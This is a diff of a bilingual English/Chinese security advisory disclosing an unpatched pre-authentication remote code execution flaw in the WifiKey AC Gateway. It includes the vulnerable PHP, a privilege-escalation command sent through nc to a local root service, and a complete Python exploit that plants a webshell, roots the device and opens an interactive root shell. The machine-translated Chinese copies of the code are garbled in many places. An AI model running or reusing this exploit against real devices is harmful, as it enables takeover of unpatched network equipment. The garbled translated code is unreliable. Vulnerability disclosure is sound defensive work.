@@ -1,30 +1,30 @@
 
 
-# SSD ADVISORY -WIFI AC网关预认证RCE
+# SSD ADVISORY -WIFI AC 网关预认证 RCE
 
 **Summary 总结**
 
 A vulnerability exists in WifiKey’s AC Gateway allowing remote attackers to trigger a pre-auth RCE vulnerability in the product allowing complete compromise of the device.  
-WifiKey的AC网关中存在一个漏洞，使得远程攻击者能够触发产品中的预认证RCE漏洞，从而完全危害设备。
+WifiKey 的 AC 网关中存在一个漏洞，使得远程攻击者能够触发产品中的预认证 RCE 漏洞，从而完全危害设备。
 
 **Credit 信用**
 
 An independent security researcher working with SSD Secure Disclosure.  
-一个独立的安全研究人员与SSD安全披露工作。
+一个独立的安全研究人员与 SSD 安全披露工作。
 
 **Affected Versions 影响版本**
 
-WifiKey AC Gateway WifiKey AC网关
+WifiKey AC Gateway WifiKey AC 网关
 
 **Vendor Response 销售商应答**
 
 We have emailed the vendor and again after 30 days, but have received no response from them. There is no known patch at this time for these vulnerabilities.  
-我们已经给供应商发了电子邮件，30天后又发了一次，但没有收到他们的回复。目前还没有针对这些漏洞的已知修补程序。
+我们已经给供应商发了电子邮件，30 天后又发了一次，但没有收到他们的回复。目前还没有针对这些漏洞的已知修补程序。
 
 **Technical Analysis 技术分析**
 
 The WifiKey AC Gateway includes a file located at `www/portal/ibilling/index.php`, this file is accessible to users without authentication – accessing it shows no information, but inspection of its content will show:  
-WifiKey AC网关包括一个位于 `www/portal/ibilling/index.php` 的文件，用户无需身份验证即可访问该文件-访问它不会显示任何信息，但检查其内容将显示：
+WifiKey AC 网关包括一个位于 `www/portal/ibilling/index.php` 的文件，用户无需身份验证即可访问该文件 - 访问它不会显示任何信息，但检查其内容将显示：
 
 <?php <？PHP
 
@@ -73,7 +73,7 @@ if ($radius-\>login($ip, $user, $passwd) != 0) {
 if（$radius->login（$ip，$user，$passwd）！= 0){1}
 
 echo json\_encode(array('error-code' =\> 1, 'error-msg' =\> ($radius-\>error())));  
-echo json\_encode（array（'error-code' => 1，'error-msg' =>（$radius->error（）;
+echo json\_encode (array ('error-code' => 1,'error-msg' =>($radius->error ();
 
 return;  
 返回;
@@ -81,7 +81,7 @@ return;
 }
 
 echo json\_encode(array('type' =\> '2', 'error-code' =\> 0, 'error-msg' =\> 'success', 'serial-no' =\> $serial, 'len' =\> 250));  
-echo json\_encode（array（'type' => '2'，'error-code' => 0，'error-msg' => ' success '，'serial-no' => $serial，'len' => 250））;
+echo json\_encode (array ('type' => '2','error-code' => 0,'error-msg' => ' success ','serial-no' => $serial,'len' => 250));
 
 } else if ($type == '3') {  
 } else if（$type == '3'）{
@@ -90,7 +90,7 @@ if ($radius-\>logout($ip) != 0) {
 if（$radius->logout（$ip）！= 0){1}
 
 echo json\_encode(array('error-code' =\> 1, 'error-msg' =\> ($radius-\>error())));  
-echo json\_encode（array（'error-code' => 1，'error-msg' =>（$radius->error（）;
+echo json\_encode (array ('error-code' => 1,'error-msg' =>($radius->error ();
 
 return;  
 返回;
@@ -98,7 +98,7 @@ return;
 }
 
 echo json\_encode(array('type' =\> '4', 'error-code' =\> 0, 'error-msg' =\> 'success', 'serial-no' =\> $serial, 'len' =\> 250));  
-echo json\_encode（array（'type' => '4'，'error-code' => 0，'error-msg' => ' success '，'serial-no' => $serial，'len' => 250））;
+echo json\_encode (array ('type' => '4','error-code' => 0,'error-msg' => ' success ','serial-no' => $serial,'len' => 250));
 
 } else if ($type == '5') {  
 } else if（$type == '5'）{
@@ -107,20 +107,20 @@ echo json\_encode（array（'type' => '4'，'error-code' => 0，'error-msg' => '
 @exec（“/usr/hls/bin/arctl -m pass -i $ip -t $bypass”，$info）;
 
 echo json\_encode(array('type' =\> '6', 'error-code' =\> 0, 'error-msg' =\> 'success', 'serial-no' =\> $serial, 'len' =\> 250));  
-echo json\_encode（array（'type' => '6'，'error-code' => 0，'error-msg' => ' success '，'serial-no' => $serial，'len' => 250））;
+echo json\_encode (array ('type' => '6','error-code' => 0,'error-msg' => ' success ','serial-no' => $serial,'len' => 250));
 
 }
 
 As you can see the snippet doesn’t require any authorisation, while looking on the file you will notice the `exec` function accepts two parameters `$ip` and `$bypass`. If we change the type value to `5` the user can control the `$ip` value. Since there is no any escaping method we can execute any commands.  
-正如你所看到的，这个代码片段不需要任何授权，在查看文件时，你会注意到 `exec` 函数接受两个参数 `$ip` 和 `$bypass` 。如果我们将type值更改为 `5` ，则用户可以控制 `$ip` 值。由于没有任何转义方法，我们可以执行任何命令。
+正如你所看到的，这个代码片段不需要任何授权，在查看文件时，你会注意到 `exec` 函数接受两个参数 `$ip` 和 `$bypass` 。如果我们将 type 值更改为 `5` ，则用户可以控制 `$ip` 值。由于没有任何转义方法，我们可以执行任何命令。
 
 **Rooting 生根**
 
 While the above RCE will get you limited access (running as the web user) a service running on the device on port `1981` can be used to gain elevated privileges, this can be simply done by issuing the following command:  
-虽然上面的RCE将为您提供有限的访问权限（作为Web用户运行），但可以使用在端口 `1981` 上的设备上运行的服务来获得提升的权限，这可以通过发出以下命令来简单地完成：
+虽然上面的 RCE 将为您提供有限的访问权限（作为 Web 用户运行），但可以使用在端口 `1981` 上的设备上运行的服务来获得提升的权限，这可以通过发出以下命令来简单地完成：
 
 echo tcpdump capture dev lo count 2 expr '$(id>/www/i.txt)'|nc 127.0.0.1 1981  
-echo tcpdump capture dev lo count 2 expr '$（id>/www/i.txt）'| 127.0.0.1 1981
+echo tcpdump capture dev lo count 2 expr '$(id>/www/i.txt)'| 127.0.0.1 1981
 
 **Proof of Concept 概念验证**
 
@@ -133,17 +133,17 @@ from time import sleep 从时间导入睡眠
 import readline 导入读取行
 
 from base64 import b64encode as base64\_encode  
-从base64导入b64 encode作为base64\_encode
+从 base64 导入 b64 encode 作为 base64\_encode
 
 import requests 导入请求
 
 import binascii 进口比纳斯
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning  
-从requests.packages.urllib3.exceptions导入InsecureRequestWarning
+从 requests.packages.urllib3.exceptions 导入 InsecureRequestWarning
 
 requests.packages.urllib3.disable\_warnings(InsecureRequestWarning)  
-requests.packages.urllib3.disable\_warnings（InsecureRequestWarning）
+requests.packages.urllib3.disable\_warnings (InsecureRequestWarning)
 
 ROOT\_SCR = """cat > /tmp/.r << \_EOT  
 ROOT\_SCR =“cat > /tmp/.r << \_EOT
@@ -152,7 +152,7 @@ ROOT\_SCR =“cat > /tmp/.r << \_EOT
 
 touch /tmp/.rdie 触摸/tmp/.rdie
 
-sleep 1 休眠1
+sleep 1 休眠 1
 
 rm -rf /tmp/.rdie /tmp/.r
 
@@ -170,13 +170,13 @@ chmod 777 /tmp/.cmdout
 chmod 777 /tmp/. xmlout
 
 chwon 100:33 /tmp/.cmdout  
-chwon 100：33 /tmp/. callout
+chwon 100:33 /tmp/. callout
 
 cat /tmp/.rcmd | sh >>/tmp/.cmdout 2>>/tmp/.cmdout &  
 cat /tmp/.rcmd| sh >>/tmp/. cloudout 2>>/tmp/. cloudout &
 
 sleep 1  
-休眠1
+休眠 1
 
 rm -rf /tmp/.rcmd
 
@@ -189,7 +189,7 @@ rm -rf /tmp/.rdie /tmp/.rcmd /tmp/.cmdout
 rm -rf /tmp/.rdie /tmp/.rcmd /tmp/. rcmout
 
 exit 1  
-1号出口
+1 号出口
 
 fi
 
@@ -198,18 +198,18 @@ done 做
 \_EOT
 
 echo tcpdump capture dev lo count 2 expr '$(cat${IFS}/tmp/.r|sh${IFS}>/dev/null${IFS}2>/dev/null${IFS}&)' | nc 127.0.0.1 1981  
-echo tcpdump capture dev lo count 2 expr '$（cat${IFS}/tmp/.r| sh${IFS}>/dev/null${IFS}2>/dev/null${IFS}&）'| 127.0.0.1 1981
+echo tcpdump capture dev lo count 2 expr '$(cat${IFS}/tmp/.r| sh${IFS}>/dev/null${IFS}2>/dev/null${IFS}&)'| 127.0.0.1 1981
 
 echo 'echo Rooted;id;pwd;uname -a' > /tmp/.rcmd
 
-sleep 1 休眠1
+sleep 1 休眠 1
 
 cat /tmp/.cmdout && rm -rf /tmp/.cmdout 2>/dev/null  
 cat /tmp/. cloudout && rm -rf /tmp/. cloudout 2>/dev/null
 
 """
 
-class RouterRCE: 类RouterRCE：
+class RouterRCE: 类 RouterRCE：
 
 def \_\_init\_\_(self, target):  
 def \_\_init\_\_（self，target）：
@@ -227,7 +227,7 @@ $fname = $\_FILES\['shs'\]\['tmp\_name'\];
 $fname = $\_FILES \[“shs”\]“tmp\_name”\];
 
 echo shell\_exec("sh $fname 2\>&1");  
-echo shell\_exec（“sh $fname 2>&1”）;
+echo shell\_exec (“sh $fname 2>&1”);
 
 }
 
@@ -246,18 +246,18 @@ $c = $\_REQUEST\['g'\];
 $c = $\_REQUEST“g”\];
 
 echo shell\_exec("$c 2\>&1");  
-echo shell\_exec（$c 2>&1）;
+echo shell\_exec ($c 2>&1);
 
 }""" }"””
 
 payload = binascii.hexlify(payload\_plain.encode("latin1"), sep="x").decode()  
-payload = binasplane.hexlify（payload\_plain.encode（“latin1”），sep=“x”）.decode（）
+payload = binasplane.hexlify (payload\_plain.encode (“latin1”), sep=“x”).decode ()
 
 payload = "x" + payload  
-有效载荷=“x”+有效载荷
+有效载荷=“x” + 有效载荷
 
 payload = payload.replace("x", "\\\\x")  
-payload = payload.replace（“x”，“\\\\x”）
+payload = payload.replace (“x”,“\\\\x”)
 
 self.payload = (  
 payload =（
@@ -296,10 +296,10 @@ r = requests.get（self.target，verify=False，headers=self.headers，timeout=1
 if (  
 如果（
 
-"<title>碧海威L7云路由无线运营版</title>" in r.text
+"<title>碧海威 L7 云路由无线运营版</title>" in r.text
 
-or "<title>WIFISKY 7层流控路由器</title>" in r.text  
-或“WIFISKY 7流控路由器“在r.text中
+or "<title>WIFISKY 7 层流控路由器</title>" in r.text  
+或“WIFISKY 7 流控路由器“在 r.text 中
 
 ):
 
@@ -312,13 +312,13 @@ self.target“/portal/ibilling/index.php”，verify=False，timeout=1
 )
 
 if path.status\_code == 200:  
-如果path.status\_code == 200：
+如果 path.status\_code == 200：
 
 print("Checking is Done..")  
 print（“Checking is Done..“）
 
 return True  
-返回True
+返回 True
 
 def exploit(self):  
 def exploit（self）：
@@ -327,7 +327,7 @@ print("Sending Paylod")
 print（“正在发送工资单”）
 
 r = requests.post(  
-2019 - 05 - 25 requests.post01：02
+2019 - 05 - 25 requests.post01:02
 
 self.target + "/portal/ibilling/index.php",  
 self.target“/portal/ibilling/index.php”，
@@ -347,7 +347,7 @@ timeout=1，
 )
 
 if r.status\_code != 200 or r.text.find("error-code") == \-1:  
-if r.status\_code！= 200或r.text.find（“error-code”）== -1：
+if r.status\_code！= 200 或 r.text.find（“error-code”）== -1：
 
 print("Error exploiting target")  
 print（“利用目标时出错”）
@@ -359,13 +359,13 @@ print(r.text)
 print（r.text）
 
 return False  
-返回False
+返回 False
 
 print(f"Status Code: {r.status\_code}, Response: {r.json()}")  
 print（f“状态代码：{r.status\_code}，响应：{r.json（）}”）
 
 print("Verifying webshell...")  
-print（“打印webshell.“）
+print（“打印 webshell.“）
 
 tot = 30  
 总计= 30
@@ -376,7 +376,7 @@ up = False
 上=假
 
 while c < tot:  
-当c < tot时：
+当 c < tot 时：
 
 b = requests.post(  
 B = requests.post（
@@ -396,10 +396,10 @@ timeout=1，
 )
 
 if b.status\_code == 200 and b.text.find("SHELL\_UPLOAD") != \-1:  
-如果B.status\_code == 200且B.text.find（“SHELL\_UPLOAD”）！= -1：
+如果 B.status\_code == 200 且 B.text.find（“SHELL\_UPLOAD”）！= -1：
 
 sys.stdout.write(f"\\nShell confirmed in {c} seconds.\\n")  
-sys.stdout.write（f”\\nShell已在{c}秒内确认。\\ n”）
+sys.stdout.write（f”\\nShell 已在{c}秒内确认。\\ n”）
 
 sys.stdout.flush()  
 sys.stdout.flush（）
@@ -425,19 +425,19 @@ if not up:
 如果不向上：
 
 return False  
-返回False
+返回 False
 
 print("Shell uploaded.")  
-print（“Shell已上传。“）
+print（“Shell 已上传。“）
 
 return True  
-返回True
+返回 True
 
 def shell(self):  
 def shell（self）：
 
 print("\\nStarting shell execution")  
-print（“\\n正在启动shell执行”）
+print（“\\n正在启动 shell 执行”）
 
 print("Rooting server")  
 print（“根服务器”）
@@ -451,7 +451,7 @@ self.target“/ix.php”，files={“shs”：ROOT\_SCR}，verify=False，timeou
 )
 
 if b.status\_code != 200 or b.text.find("uid=0(root)") == \-1:  
-如果B.status\_code！= 200或B.text.find（“uid=0（root）”）== -1：
+如果 B.status\_code！= 200 或 B.text.find（“uid=0（root）”）== -1：
 
 print("\\n- Rooting the server failed, Please do that manually.")  
 print（“\\n-根服务器失败，请手动完成。“）
@@ -466,7 +466,7 @@ else:
 否则：
 
 print("- Server rooted.")  
-print（“-服务器root。“）
+print（“-服务器 root。“）
 
 print("+ Debug output: ")  
 print（“+“）
@@ -475,10 +475,10 @@ print(b.text)
 打印（B.文本）
 
 print("\\nStarting webshell, Use quit to exit.\\n")  
-print（“\\n正在启动webshell，使用quit退出。\\ n”）
+print（“\\n正在启动 webshell，使用 quit 退出。\\ n”）
 
 readline.parse\_and\_bind("set editing-mode emacs")  
-readline.parse\_and\_bind（“设置emacs编辑模式”）
+readline.parse\_and\_bind（“设置 emacs 编辑模式”）
 
 while True:  
 为真时：
@@ -487,16 +487,16 @@ cmd = input(f"root@\[{self.target}\]# ")
 cmd = input（f“root@\[{self.target}\]#“）
 
 if cmd.strip() in \["exit", "quit"\]:  
-if cmd.strip（）in \[“exit”，“quit”\]：
+if cmd.strip () in \[“exit”，“quit”\]：
 
 print("Exiting")  
 print（“Exiting”）
 
 return True  
-返回True
+返回 True
 
 cmd\_enc = base64\_encode(cmd.encode()).decode()  
-cmd\_enc = base64\_encode（cmd.encode（））.decode（）
+cmd\_enc = base64\_encode (cmd.encode ()).decode ()
 
 mycmd = (  
 mysql =（
@@ -539,7 +539,7 @@ print("Target is Vulnerable Sending Payload")
 print（“Target is Vulnerable Sending Payload”）
 
 if not self.exploit():  
-如果没有self.exploit（）：
+如果没有 self.exploit（）：
 
 exit("Exploitation Failed Something is wrong")  
 exit（“Exploitation Failed Something is wrong”）
@@ -552,19 +552,19 @@ def usage(): def usage（）：
 print(f"\[-\] {sys.argv\[0\]} http(s)://target\_url")  
 print（f”\[-\] {sys.argv\[0\]} http（s）：//target\_url”）
 
-def main(): 定义main（）：
+def main(): 定义 main（）：
 
 if sys.version\_info\[0\] != 3:  
 如果系统版本信息\[0\]！=第三章：
 
 print("Use Python 3 to run this Script.")  
-print（“使用Python 3运行此脚本。“）
+print（“使用 Python 3 运行此脚本。“）
 
 sys.exit(\-1)  
 系统退出（-1）
 
 if len(sys.argv) < 2:  
-如果len（sys.argv）< 2：
+如果 len（sys.argv）< 2：
 
 usage()  
 usage（）
@@ -573,7 +573,7 @@ sys.exit(\-1)
 系统退出（-1）
 
 RouterRCE(sys.argv\[1\]).run()  
-RouterRCE（sys.argv\[1\]）.run（）
+RouterRCE (sys.argv\[1\]）.run（）
 
 if \_\_name\_\_ == "\_\_main\_\_":  
 如果\_\_名称\_\_ ==“\_\_主要\_\_"：
@@ -588,7 +588,7 @@ except KeyboardInterrupt:
 键盘中断除外：
 
 print("\*CRT+C Received.\* ====> Aborting")  
-print（“\*CRT+C已接收。\* =>正在中止”）
+print（“\*CRT+C 已接收。\* =>正在中止”）
 
 sys.exit(\-1)  
 系统退出（-1）
